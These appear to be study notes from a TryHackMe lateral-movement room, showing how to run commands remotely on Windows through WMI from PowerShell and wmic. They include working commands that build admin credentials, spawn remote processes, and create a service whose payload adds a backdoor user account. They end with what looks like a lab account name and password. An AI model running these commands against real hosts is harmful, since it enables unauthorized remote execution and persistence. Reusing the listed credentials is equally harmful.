#  Moving Laterally Using WMI

## Connecting to WMI From Powershell

Create a Powershell $Credential object using the following commands:

```shell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
``` 

We then proceed to establish a WMI session using either of the following protocols:
	-**DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
	-**Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use throughout the room on the different techniques:
```shell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI
-**Ports**:
	-135/TCP, 49152-65535/TCP (DCERPC)
	-5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-**Required Group Memberships**: Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```shell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

On legacy systems, the same can be done using wmic from the command prompt:
`wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"`

## Creating Services Remotely with WMI
-**Ports**:
	-135/TCP, 49152-65535/TCP (DCERPC)
	-5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-**Required Group Memberships**: Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
```shell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

ZA.TRYHACKME.COM\t1_corine.waters

Korine.1994